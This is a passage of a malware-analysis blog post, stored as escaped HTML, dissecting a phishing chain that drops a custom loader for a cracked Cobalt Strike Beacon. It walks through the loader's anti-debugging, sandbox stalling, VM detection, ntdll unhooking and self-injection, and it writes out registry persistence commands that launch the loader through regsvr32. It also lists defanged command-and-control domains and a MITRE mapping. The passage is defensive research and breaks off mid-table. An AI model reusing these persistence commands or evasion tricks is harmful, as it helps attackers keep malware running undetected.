are highly obfuscated:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt2b37b1576b008675\" alt=\"fig6_scriplet.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt2b37b1576b008675/662980e145f98904f0cf6ed8/fig6_scriplet.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 6: Obfuscated scriplet content\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eAfter de-obfuscation:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltac52ea4fac4551d6\" alt=\"fig7-scriptlet_de-obfuscated.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltac52ea4fac4551d6/662980dc528fc18f0455be1d/fig7-scriptlet_de-obfuscated.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 7: Scriplet deobfuscated\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe second stage dropper is an HTML file containing JavaScript code that would get executed via Windows \u003cstrong\u003ecscript.exe\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eIt’s responsible for persistency, decoding, and saving the embedded payload to disk.\u003c/p\u003e\u003ch5\u003eKey Points\u003c/h5\u003e\u003cul\u003e\u003cli\u003eDrops the payload disguised as Cisco AnyConnect VPN file under the path:\u003cul\u003e\u003cli\u003eC:\\Users\\\u0026lt;Username\u0026gt;\\AppData\\Roaming\\Cisco\\AnyConnect\\vpn.sessings\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003cli\u003eGains persistence by modifying these registry keys:\u003cul\u003e\u003cli\u003e\u003cstrong\u003eHKCU\\Software\\Microsoft\\Command Processor\\AutoRun: start regsvr32 /s C:\\\u0026lt;path\u0026gt;\\vpn.sessings -\u003c/strong\u003e This would execute the malware every time cmd.exe gets executed.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eHKCU\\Software\\Microsoft\\Windows\\CurrentVirsion\\Run: cmd /Q /C whoami - \u003c/strong\u003eThis is actual persistence. It achieves this by executing \u003cstrong\u003ewhoami\u003c/strong\u003e, which triggers the loader every time the system starts.\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThis persistence technique is unusual and could cause the payload to be executed multiple times unnecessarily, though because it looks benign, the persistence would be harder to spot by incident response and could also cause a privilege escalation if a high-privilege user or process executes cmd.exe.\u003c/p\u003e\u003ch5\u003eDLL Payload Analysis\u003c/h5\u003e\u003cp\u003eThe sample includes a loader/packer Dynamic Link Library (DLL) named \u003cstrong\u003evpn.sessings\u003c/strong\u003e that loads a Cobalt Strike Beacon into memory and awaits instructions from the C\u0026amp;C server\u003c/p\u003e\u003cp\u003eCobalt Strike was already \u003ca href=\"https://www.deepinstinct.com/blog/cobalt-strike-post-exploitation-attackers-toolkit\"\u003eanalyzed\u003c/a\u003e many times, so we won’t go into detail, but the loader contained a couple of interesting behaviors.\u003c/p\u003e\u003ch6\u003eLoader Analysis\u003c/h6\u003e\u003cp\u003eThe sample is a DLL that executes using Regsvr32.\u003c/p\u003e\u003cp\u003eMost of the important logic is inside \u003cstrong\u003eDllRegisterServer\u003c/strong\u003e.\u003c/p\u003e\u003cp\u003eThe exported methods strangely have names of undocumented low-level WinAPI calls (Nt, Zw, Rt), but most were empty and unused.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt4709165469601da7\" alt=\"fig8-loader_export_table.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt4709165469601da7/662980dc81c8846696380625/fig8-loader_export_table.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 8: Loader export table\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe loader attempts to terminate the parent process (anti-debugging), iterating over running processes and looking for itself. Then, it attempts to terminate its parent process:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltc424f7c746d42655\" alt=\"fig9-terminate_parent.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc424f7c746d42655/662980dc58ce883b0fc30d69/fig9-terminate_parent.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 9: Terminate parent\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eWhen it is executed from the “Command Processor” registry key, it runs under a “\u003cstrong\u003eNon-Existent Process\u003c/strong\u003e,” meaning there is no parent process it could terminate. However, while debugging, it terminates together with the debugger, slowing analysis – and annoys the researcher!\u003c/p\u003e\u003cimg asset_uid=\"bltc9bae58f8841bd48\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc9bae58f8841bd48/66298108ac4b002087c435ca/figX-annoyed-researcher.png\" alt=\"figX-annoyed-researcher.png\" height=\"auto\"/\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eStalling Execution (Possible Sandbox Evasion)\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe loader dynamically loads the low-level \u003cstrong\u003eNtDelayExecution \u003c/strong\u003eWinAPI Call, and stalls for 20 seconds without any clear functional reason.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltb582b8be7f4ba7c2\" alt=\"fig10-delay_execution.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltb582b8be7f4ba7c2/662980dc776d0c5c3124e7d3/fig10-delay_execution.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 10: Delay execution\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003ePossible explanations could be to either slow debugging or evade sandboxes.\u003c/p\u003e\u003cp\u003eIt may exploit the fact that preventive sandbox emulations need to deal with large volumes of malware and can only last for short periods of time (2-5 min).\u003c/p\u003e\u003cp\u003eMost solutions skip long sleeps/delays, but here it was executed 20 times, \u0026shy;each for a second, possibly trying to bypass automatic skips while also delaying the execution slightly.\u003c/p\u003e\u003cp\u003eOne-second delays look like a short amount, but because these calls are usually hooked for monitoring, each call takes longer and could exclude important indicators from emulation windows.\u003c/p\u003e\u003ch6\u003e\u003cem\u003eCheck \u003c/em\u003e\u003cem\u003e\u003cstrong\u003eCPUID\u003c/strong\u003e\u003c/em\u003e\u003cem\u003e (Anti-VM)\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe loader executes \u003cstrong\u003eCPUID\u003c/strong\u003e using an inline ASM instruction to determine whether the malware is being executed in a virtual machine.\u003c/p\u003e\u003cp\u003eThe \u003cstrong\u003eCPUID \u003c/strong\u003ex86 instruction returns a \u003cstrong\u003enegative \u003c/strong\u003evalue if executed in a \u003cstrong\u003eVM \u003c/strong\u003e(the 2^31 bit is set to 1; \u003cstrong\u003esigned\u003c/strong\u003e values over \u003cem\u003e0x80000000\u003c/em\u003e are negative).\u003c/p\u003e\u003cp\u003eWe can see in the instruction below that it would return true if \u003cstrong\u003eCPUID \u003c/strong\u003ereturns a positive number:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt52ebfe0b956dc5cf\" alt=\"fig11-check_vm.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt52ebfe0b956dc5cf/662980f3528fc1517055be22/fig11-check_vm.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 11: Checks if the malware executed inside a VM\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eIf this condition is \u003cstrong\u003efalse\u003c/strong\u003e, it simply \u003cstrong\u003eexits\u003c/strong\u003e, but the interesting thing is that it performs this check in other places. This includes a check at \u003cstrong\u003eDllEntryPoint\u003c/strong\u003e (executed before \u003cstrong\u003eDllRegisterServer)\u003c/strong\u003e, which assigns a global variable that can later change some of the behavior.\u003c/p\u003e\u003ch6\u003e\u003cem\u003eUnhooking \u003c/em\u003e\u003cem\u003e\u003cstrong\u003eNTDLL \u003c/strong\u003e\u003c/em\u003e\u003cem\u003e(Anti-AM)\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe dynamic link library \u003cstrong\u003entdll.dll\u003c/strong\u003e is the lowest-level Windows API call interface between User Mode and Kernel Mode.\u003c/p\u003e\u003cp\u003eBecause of that, anti-malware vendors usually place hooks inside various calls to monitor for malicious behavior. If malware wants to avoid detection, it needs to find a way to circumvent these protections.\u003c/p\u003e\u003cp\u003eThe idea is straightforward: a pre-loaded ntdll.dll in memory contains inline hooks inside various API calls, which the malware needs to bypass or overwrite to avoid detection.\u003c/p\u003e\u003cp\u003eIn the screenshot below, we can see a memory mapping of \u003cstrong\u003entdll.dll\u003c/strong\u003e from \u003cstrong\u003edisk\u003c/strong\u003e, together with the fetching of the \u003cstrong\u003eloaded module \u003c/strong\u003eof \u003cstrong\u003entdll.dll\u003c/strong\u003e from the memory of the running process:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltac0a764a87f7a127\" alt=\"fig12-loading_both_dlls.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltac0a764a87f7a127/662980f4e7ce95a585deac72/fig12-loading_both_dlls.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 12: Loading both ntdlls\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThey are called:\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cstrong\u003eMemNTDLL : \u003c/strong\u003efor the loaded module from memory\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eDiskNTDLL : \u003c/strong\u003efor the copy of ntdll.dll from disk\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThis looks like obvious unhooking, but the rest of the code was overwhelmingly complicated, and for some reason, it didn’t unhook in our tests.\u003c/p\u003e\u003cp\u003eIt took some time, and after digging deeper, we’ve encountered a couple of additional tricks the malware authors did to slow analysis.\u003c/p\u003e\u003cp\u003eI’ve divided these delaying techniques into several points:\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e1.\u0026nbsp;Over-complicated bloat code\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eIt’s difficult to understand the exact purpose, but\u003cstrong\u003e \u003c/strong\u003ewe suspect it was done intentionally to waste threat analysts’ time, as we can see in the example code below:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt52d92beb3dd8d7dc\" alt=\"fig13-nonsense_code.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt52d92beb3dd8d7dc/662980f3fb977c0c1936bba6/fig13-nonsense_code.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 13: Nonsense code\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThis piece of code is called from the function responsible for unhooking ntdll.dll, and the variables \u003cstrong\u003elp_text_base_DiskNTDLL/MemNTDLL\u003c/strong\u003e are LONG_PTR addresses of both DLLs in memory.\u003c/p\u003e\u003cp\u003eBecause \u003cstrong\u003eMemNTDLL\u003c/strong\u003e always wants to be loaded by the operating system at the highest User Space module address – 0x77000000 (32-bit) above – with some variation due to ASLR, the condition \u003cstrong\u003elp_text_base_DiskNTDLL\u003c/strong\u003e \u0026gt; \u003cstrong\u003elp_text_base_MemNTDLL\u003c/strong\u003e would \u003cstrong\u003enever\u003c/strong\u003e be true.\u003c/p\u003e\u003cp\u003eAt least from this context.\u003c/p\u003e\u003cp\u003eThis function also gets called from other locations full of bloat code, not related to unhooking.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e2. Hidden additional VM check (as mentioned above)\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt7c9186bdd9ac1ad2\" alt=\"fig14-DllEntryPoint_CPUID.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt7c9186bdd9ac1ad2/662980f3b8b5ce2379dc2937/fig14-DllEntryPoint_CPUID.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 14: DllEntryPoint check VM\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eIf the check is \u003cstrong\u003efalse\u003c/strong\u003e, it does not unhook and instead diverts the execution flow into ... can you guess?\u003c/p\u003e\u003cp\u003eMore bloat code:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt37ed9ef14f6b2947\" alt=\"fig15-unhook_and_bloat_code.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt37ed9ef14f6b2947/662980f458ce882287c30d71/fig15-unhook_and_bloat_code.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 15: Unhook and bloat code\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eMalware developers are known to create dummy behavior to slow down analysis.\u003c/p\u003e\u003cp\u003eIt’s an effective trick, and knowing that, it’s better to move on without diving into overly complicated code with no clear purpose, especially if it doesn’t get executed under normal conditions.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e3. Structs with manual offsets\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eThe authors also used arbitrary offsets while manually loading various PE structures to make the reconstruction more difficult:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltaf62504dce96670d\" alt=\"fig16-arbitrary_offsets.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltaf62504dce96670d/6629810824e18134c8acf093/fig16-arbitrary_offsets.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 16: Arbitrary offsets\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eAfter reconstruction, it’s easier to see that it looks for the \u003cstrong\u003e.text\u003c/strong\u003e section (containing all the function implementations), changes the permissions to \u003cstrong\u003ePAGE_EXECUTE_READWRITE\u003c/strong\u003e, and then sends it to be overwritten with the original ntdll.dll:IOCs:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltb64ca9b06ed14593\" alt=\"fig17-after_reconstruction.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltb64ca9b06ed14593/66298108b0544189de9a07a9/fig17-after_reconstruction.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 17: After reconstruction\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eDecrypts Payload (Cobalt Strike)Network\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eUses a standard decryption routine\u003c/p\u003e\u003cul\u003e\u003cli\u003eHash base_data/key_seed\u003c/li\u003e\u003cli\u003eDerive key from hash\u003c/li\u003e\u003cli\u003eDecrypt:\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt2dcc6aab23066577\" alt=\"fig18-decrypt_payload.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt2dcc6aab23066577/66298108ca8874915ded46c8/fig18-decrypt_payload.jse.png\" width=\"auto\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 18: Decrypt payload (Beacon)\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eSelf-DLL Injects Cobalt Strike\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThis is meant to hide the payload, avoid storing the file on disk (file-less), bypass remote injection heuristics, and, as always, complicate the analysis.\u003c/p\u003e\u003cp\u003eThe procedure is as follows:\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cstrong\u003eOpenProcess\u003c/strong\u003e\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eAllocateMemory\u003c/strong\u003e inside it\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eWriteProcessMemory\u003c/strong\u003e with the payload\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eCreateRemoteThread\u003c/strong\u003e inside itself\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eWaitForSingleObject\u003c/strong\u003e until that thread finishes\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt4284fcffd11b6423\" alt=\"fig19-self_dll_injection.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt4284fcffd11b6423/66298108a02ad7fa87eea4c7/fig19-self_dll_injection.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 19: Self DLL injection\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eExtracted Cobalt Strike Config:\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe Cobalt Strike config contains a public key for asymmetric key exchange for encrypted communications with the C\u0026amp;C.\u003c/p\u003e\u003cp\u003eThe \u003cstrong\u003elicence_id : 0\u003c/strong\u003e indicates that this is a cracked version of Cobalt Strike.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt1b287ae7003870ef\" alt=\"fig20-ExtractedConfig.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt1b287ae7003870ef/6629867f81c8845dde38064c/fig20-ExtractedConfig.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 20: Extracted config\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe Cobalt Beacon has a detailed config with the C\u0026amp;C address/domain name, URI, public key, and even the process that it would inject into (dllhost.exe).\u003c/p\u003e\u003cp\u003eIt awaits instruction from the C\u0026amp;C server, located at \u003cstrong\u003epetapixel[.]fun\u003c/strong\u003e (disguised as a popular photography site), also hidden behind Cloudflare, and registered in an EU country with GDPR masking, making it more difficult to investigate.\u003c/p\u003e\u003cp\u003eIt did mention it was registered in \u003cstrong\u003eWarsaw, Poland\u003c/strong\u003e.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt0180209fb534a61f\" alt=\"fig21-location.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt0180209fb534a61f/6629867f210d90e2833a5678/fig21-location.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 21: Registration location\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch5\u003eConclusion\u003c/h5\u003e\u003cp\u003eThe Deep Instinct Threat Lab could not attribute these attacks to any known threat actor or exclude the possibility that this was part of a red team exercise.\u003c/p\u003e\u003cp\u003eThe evidence shows that this sample was uploaded from Ukraine, the second stage (weavesilk[.]space) was hosted and registered under a Russian VPS provider, and the Cobalt beacon C\u0026amp;C (petapixel[.]fun) was registered in Warsaw, Poland.\u003c/p\u003e\u003cp\u003eThe binary (\u003cem\u003evpn.sessings\u003c/em\u003e) contains a custom loader/packer for the Cobalt Strike Beacon with various techniques to slow analysis and \u003ca href=\"/endpoint-detection-response\" target=\"_self\"\u003ebypass cybersecurity solutions\u003c/a\u003e. Most of the techniques are not new but could be unique enough to be used as a fingerprint.\u003c/p\u003e\u003cp\u003eThe Cobalt Strike Beacon by itself is a professional pen-testing tool designed for evaluating computer security by red teams, but this is the leaked cracked version, so we can’t trace it to any legitimate user.\u003c/p\u003e\u003cp\u003eCobalt is an advanced tool with a wide range of capabilities, such as stealing sensitive data, elevating privileges, propagating to other computers in the network, downloading tools, and more. Without additional clues, it’s hard to understand the exact purpose of the attack.\u003c/p\u003e\u003cp\u003eThe lure contained military-related content, suggesting it was targeting military personnel. But the domain names weavesilk[.]space and petapixel[.]fun are disguised as an obscure generative art site (http://weavesilk.com) and a popular photography site (https://petapixel.com). These are unrelated, and it’s a bit puzzling why an attacker would use these specifically to fool military personnel.\u003c/p\u003e\u003cp\u003e\u003cp\u003eAs of the day of discovery, the loader was undetectable by most engines, while Deep Instinct prevented it on day 0.\u003c/p\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003eMITRE\u003c/h6\u003e\u003ctable style=\"width: 100%;\"\u003e\u003ccolgroup data-width='651.004557013671'\u003e\u003ccol style=\"width:21.351778648221355%\"/\u003e\u003ccol style=\"width:16.436283563716437%\"/\u003e\u003ccol style=\"width:21.65897834102166%\"/\u003e\u003ccol style=\"width:40.55295944704055%\"/\u003e\u003c/colgroup\u003e\u003cthead class=\"bg-grey\"\u003e\u003ctr\u003e\u003cth\u003e\u003cp\u003eTactic\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eTechnique\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eDescription\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eObservable\u003c/p\u003e\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eInitial Access\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1566\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePhishing\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePowerPoint signal-2023-12-20-160512.ppsx containing RELS exploit\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eExecution\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1059.007\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eCommand and Scripting Interpreter: JavaScript\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ewidget_iframe.617766616773726468746672726a6834.html containing obfuscated JavaScript\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003ePersistence\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1547.001\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eRegistry Run Keys\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eHKCU\\Software\\Microsoft\\Windows\\CurrentVirsion\\Run: cmd /Q /C whoami\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003ePersistence\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003e\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eEvent-Triggered Execution\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003e\u003cem\u003eHKCU\\Software\\Microsoft\\Command Processor\\AutoRun: start regsvr32 /s C:\\\u0026lt;path\u0026gt;\\vpn.sessings\u003c/em\u003e\u003c/p\u003e\u003cp\u003eNew sub-technique submitted to MITRE\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1218.010\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eSystem Binary Proxy Execution:\u0026nbsp;Regsvr32\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003estart regsvr32 /s C:\\\u0026lt;path\u0026gt;\\vpn.sessings\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1055\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eProcess Injection\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePerformed a self-injection after unpacking the Cobalt Strike Beacon, using the classic \u003cstrong\u003eCreateRemoteThread\u003c/strong\u003e method\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1027.002\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eSoftware Packing\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eUnpacked the Cobalt Beacon using \u003cstrong\u003eCryptDecrypt\u003c/strong\u003e\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDiscovery\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1057\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eProcess Discovery\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eIterated the running processes to terminate its parent for anti-debugging\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1497\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eVirtualization/Sandbox Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePerformed \u003cstrong\u003eNtDelayExecution\u003c/strong\u003e to stall execution, possibly to evade automatic sandbox emulation by exploiting time constraints\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eCommand and Control\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1573\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eEncrypted Channel\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eC\u0026amp;C communication using HTTPS on port 